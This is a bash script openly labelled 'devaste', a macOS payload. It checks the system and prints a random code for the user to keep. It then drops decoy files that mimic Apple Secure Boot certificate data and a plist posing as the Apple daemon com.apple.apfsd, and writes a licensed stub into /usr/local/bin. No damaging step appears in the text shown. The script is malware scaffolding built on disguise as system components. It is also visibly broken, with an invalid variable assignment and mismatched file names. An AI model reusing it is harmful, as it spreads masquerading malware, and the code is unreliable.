#!/bin/bash

 sys="/System"
if [ ! -d "$sys" ]; then
    echo "  devaste is a macOS payload. Exit with error: unsupported system."
    exit 1
else
   echo
   echo "  Please wait."

fi

$loc=/usr/local/bin

if [ ! -e $loc ]; then
    mkdir /usr/local/bin
fi

mkdir /tmp/devaste
  dtmp="/tmp/devaste"
  
touch $dtmp/pdata.txt
cd $dtmp

array=()
for i in {a..z} {A..Z} {0..9}; 
do
  array[$RANDOM]=$i
  done
  printf %s ${array[@]::8} $'\n'

  echo "  --> Save the combination given above. You will need it later."
  sleep 10

  cat > pdat.txt <<EOF
  /System/Volumes/Preboot
  The quick brown fox jumps over the lazy dog
EOF

touch /tmp/dvsSHDir.im4m && touch /tmp/dvsSHpD.plist
cat > dvsSHDir.im4m <<EOF
"Apple X86 Secure Boot Root CA - G110U
Apple Inc.10	USS0
170323023206Z
170323214243Z0_1;09-TssLive-ManifestKeyGlobal-RevB-DataCenter10U
EOF

cat > dvsSHpD.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.apple.apfsd</string>
	<key>LastUpload</key>
	<real>746068375.54527998</real>
</dict>
</plist>
EOF

cd /usr/local/bin
touch devaste.txt
cat > devaste.txt <<EOF
#!/usr/bin/env bash
# vim: noai:ts=4:sw=4:expandtab
# shellcheck source=/dev/null
# shellcheck disable=2009
#
# devaste: macOS payload for your system
# https://github.com/vastrave/devaste
#
# The MIT License (MIT)
#
# Copyright (c) 2024 vastrality
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
EOF

